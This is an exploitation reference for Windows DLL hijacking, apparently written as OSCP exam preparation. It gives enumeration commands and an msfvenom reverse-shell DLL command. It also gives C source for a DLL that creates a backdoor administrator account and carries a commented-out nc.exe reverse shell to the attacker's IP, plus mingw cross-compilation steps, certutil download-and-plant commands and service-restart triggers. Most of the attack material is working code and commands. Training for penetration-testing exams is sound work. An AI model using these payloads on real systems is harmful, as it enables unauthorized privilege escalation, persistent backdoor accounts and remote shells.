# DLL Hijacking -- Full Exploitation Reference

> **Quick answer: Do you need a Windows machine?**
> **NO.** You can cross-compile malicious DLLs entirely from Kali using mingw. No Procmon, no Visual Studio, no Windows VM required.
>
> OffSec states they will provide a Windows machine if the exam requires one for payload development. If your exam environment does NOT include a Windows client machine, DLL hijacking may still appear -- you just won't need Procmon because the vulnerable DLL name will be discoverable through other means (service documentation, known CVEs, or error messages).

---

## How DLL Hijacking Works

When a Windows application starts, it searches for required DLLs in a specific order. If the application tries to load a DLL that doesn't exist (or exists in a lower-priority location), and you can write to a higher-priority search location, you can place a malicious DLL there instead.

### Windows DLL Search Order

When an application calls LoadLibrary("example.dll"), Windows searches in this order:

1. The directory the application was loaded from
2. The system directory (C:\Windows\System32)
3. The 16-bit system directory (C:\Windows\System)
4. The Windows directory (C:\Windows)
5. The current working directory
6. Directories in the PATH environment variable

**The attack**: If a service at C:\Program Files\VulnApp\service.exe tries to load helper.dll and that DLL doesn't exist in any of these locations, Windows returns NAME NOT FOUND. If you can write to C:\Program Files\VulnApp\, you place your malicious helper.dll there (search order position 1), and it gets loaded next time the service starts.

---

## Step 1: Identify DLL Hijack Opportunities

### Enumeration Commands (Run These on Target)

Find auto-start services with non-system paths:

    wmic service get name,pathname,startmode | findstr /v /i "C:\Windows" | findstr /i "auto"

Check if you can write to those directories (look for M, W, or F permissions):

    icacls "C:\Program Files\VulnApp\"

Automated scan with PowerUp:

    powershell -ep bypass -c ". .\PowerUp.ps1; Find-ProcessDLLHijack; Find-PathDLLHijack"

### What Makes It Exploitable -- The Three Requirements

1. **A service runs from a non-system directory** (not C:\Windows\*)
2. **That directory is writable by your user** (icacls shows M, W, or F for your user/group)
3. **You know which DLL name the service expects** (this is the tricky part)

If you have #1 and #2, you have a candidate. The question is how to find #3.

---

## Step 2: Find the Missing DLL Name

This is where the "do I need Windows?" question comes up. There are multiple approaches:

### Option A: Procmon on a Windows Machine (Best, But Not Always Available)

If the exam provides a Windows client machine:

1. Transfer Procmon64.exe to target (or run on the Windows client if same architecture)
2. Start Procmon, set these filters:
   - Process Name is service.exe -- Include
   - Result is NAME NOT FOUND -- Include
   - Path ends with .dll -- Include
3. Restart the vulnerable service: sc stop VulnService && sc start VulnService
4. Procmon shows exactly which DLL names the service tried to load and failed

### Option B: Known Vulnerable Software (Most Likely on OSCP)

Many applications have **documented DLL hijack vulnerabilities** with known DLL names. If you identify the software and version, search for:

    searchsploit "application name" dll
    searchsploit "application name" hijack

**Known OSCP-relevant DLL hijacks:**

| Software | Missing DLL | Notes |
|----------|------------|-------|
| UniFi Video | taskkill.dll | Giddy (HTB) -- service runs as SYSTEM |
| Druva inSync | DLL in writable app dir | Known CVE, check version |
| Various .NET apps | version.dll | Common first-load attempt |
| Custom services | Check application docs | README or config may reference dependencies |

### Option C: Common DLL Names (Spray and Pray)

If you can't identify the exact DLL, these are frequently missing from custom applications:

    version.dll
    wlanapi.dll
    CRYPTSP.dll
    dwmapi.dll
    dbghelp.dll
    WINHTTP.dll
    msvcp140.dll
    vcruntime140.dll

Try each one: place your malicious DLL with that filename, restart the service, check if your payload fires. Remove and try the next name if it doesn't.

### Option D: Check Application Error Logs

Sometimes the application logs DLL load failures:

    dir /s /b "C:\Program Files\VulnApp\*.log" 2>nul
    type "C:\Program Files\VulnApp\error.log" 2>nul

Check Windows Event Viewer for application errors:

    Get-WinEvent -FilterHashtable @{LogName='Application'; Level=2} -MaxEvents 50 |
      Where-Object {$_.Message -like "*dll*"} | Format-List TimeCreated,Message

---

## Step 3: Build the Malicious DLL

### Option A: msfvenom (Quick Reverse Shell)

On Kali -- generates a DLL that triggers a reverse shell on load:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f dll -o evil.dll

This works but only gives you a shell. If the shell dies, you need to restart the service again.

### Option B: Custom C DLL (Recommended -- More Reliable)

Create hijack.c on Kali:

    #include <stdlib.h>
    #include <windows.h>

    BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
        if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
            // Option 1: Add a new admin user (persists even if service crashes)
            system("cmd.exe /c net user pwned Password123! /add");
            system("cmd.exe /c net localgroup administrators pwned /add");

            // Option 2: Reverse shell (uncomment if preferred)
            // system("cmd.exe /c C:\\Users\\Public\\nc.exe YOUR_IP 443 -e cmd.exe");
        }
        return TRUE;
    }

Cross-compile on Kali (no Windows needed):

    # 64-bit target
    x86_64-w64-mingw32-gcc hijack.c -shared -o evil.dll

    # 32-bit target
    i686-w64-mingw32-gcc hijack.c -shared -o evil.dll

If mingw is not installed:

    sudo apt install gcc-mingw-w64 -y

### Why Custom DLL Is Better

- **net user persists**: Even if the service crashes after loading your DLL, the admin account is already created
- **Dual payload**: Add the user AND launch a reverse shell
- **No msfvenom dependency**: Works even if msfvenom is acting up
- **Architecture control**: Explicitly compile for x64 or x86

---

## Step 4: Deploy and Trigger

Transfer the DLL to target:

    # From Kali HTTP server
    certutil -urlcache -f http://YOUR_IP/evil.dll C:\Users\Public\evil.dll

    # Or via SMB
    copy \\YOUR_IP\share\evil.dll C:\Users\Public\evil.dll

Place in the vulnerable directory with the expected filename:

    copy C:\Users\Public\evil.dll "C:\Program Files\VulnApp\missing.dll"

Restart the service:

    sc stop VulnService
    sc start VulnService

If you don't have permission to restart the service, check if it auto-restarts on failure or wait for a reboot (unlikely on OSCP, but check scheduled tasks).

Verify:

    # If you used the adduser payload
    net localgroup administrators

    # If you used reverse shell, check your listener

---

## Troubleshooting

**DLL loads but no shell / no user created:**
Architecture mismatch -- 64-bit service needs x64 DLL, 32-bit needs x86. Check: is the exe in Program Files (64-bit) or Program Files (x86) (32-bit)?

**Access denied placing the DLL:**
Double-check icacls output. You need write permission for your specific user or a group you belong to. Try C:\Users\Public\ as a staging area first, then copy to the target dir.

**Service won't start after placing DLL:**
Your DLL might be crashing the service. Make sure DllMain returns TRUE. The service might also need the DLL to export specific functions -- check with dumpbin /exports on the original if available.

**Can't restart the service:**
Check if your user has service control permissions: sc sdshow VulnService.
Check if it auto-restarts: sc qfailure VulnService.
Look for a scheduled task that restarts it.

---

## OSCP Exam Context

The OffSec exam guide states that if a technique requires a Windows machine for payload development (like using Procmon or Visual Studio), they will provide one. If your exam does not include a Windows client, either DLL hijacking is not required OR the DLL name is discoverable without Procmon (known CVE, application docs, error logs).

**Bottom line**: Know the enumeration commands to identify DLL hijack opportunities. If you find a writable service directory with a non-system path, you have a candidate. The DLL name will either be discoverable from the software version (searchsploit), from application logs, or the exam will provide a Windows machine for Procmon.

Cross-compiling the malicious DLL from Kali takes 30 seconds. The hard part is finding the right filename -- not building the payload.

---

## Quick Reference Card

    ENUMERATE:  wmic service get name,pathname,startmode | findstr /v /i "C:\Windows" | findstr /i "auto"
    WRITABLE?:  icacls "C:\Program Files\VulnApp\"
    AUTOMATED:  PowerUp.ps1: Find-ProcessDLLHijack; Find-PathDLLHijack
    DLL NAME:   searchsploit "app name" dll  OR  Procmon  OR  common names
    BUILD x64:  x86_64-w64-mingw32-gcc hijack.c -shared -o evil.dll
    BUILD x86:  i686-w64-mingw32-gcc hijack.c -shared -o evil.dll
    DEPLOY:     copy evil.dll "C:\path\missing.dll" && sc stop svc && sc start svc
